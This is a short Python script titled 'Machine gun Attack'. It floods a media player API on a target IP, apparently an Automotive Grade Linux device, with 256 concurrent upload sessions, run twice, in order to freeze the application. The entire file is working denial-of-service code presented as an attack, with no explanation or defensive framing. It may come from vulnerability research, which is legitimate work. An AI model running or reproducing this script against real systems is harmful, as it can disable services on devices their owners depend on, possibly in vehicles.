# Machine gun Attack

import sys
import asyncio
import aiohttp

MEDIA_PORT = '30035'
MEDIA_API = 'afbd-mediaplayer'

async def upload(session, target):
    files = {'file': open('dummy_32k.bin', 'rb')}
    
    try :
        await session.post(f'http://{target}:{MEDIA_PORT}/api/{MEDIA_API}/dummy', data = files)
    except Exception as e:
        print(f"[Error]: {e}")

async def freeze_app(target):
    num_sessions = 256 
    for count in range(2):
        session_list = [aiohttp.ClientSession() for _ in range(num_sessions)]
        task_list = [upload(session_list[i], target) for i in range(num_sessions)]
        await asyncio.wait(task_list)
        await asyncio.wait([session.close() for session in session_list])

if __name__ == '__main__':
    agl_ip = sys.argv[1]    
    loop = asyncio.get_event_loop()
    loop.run_until_complete(loop.create_task(freeze_app(agl_ip)))
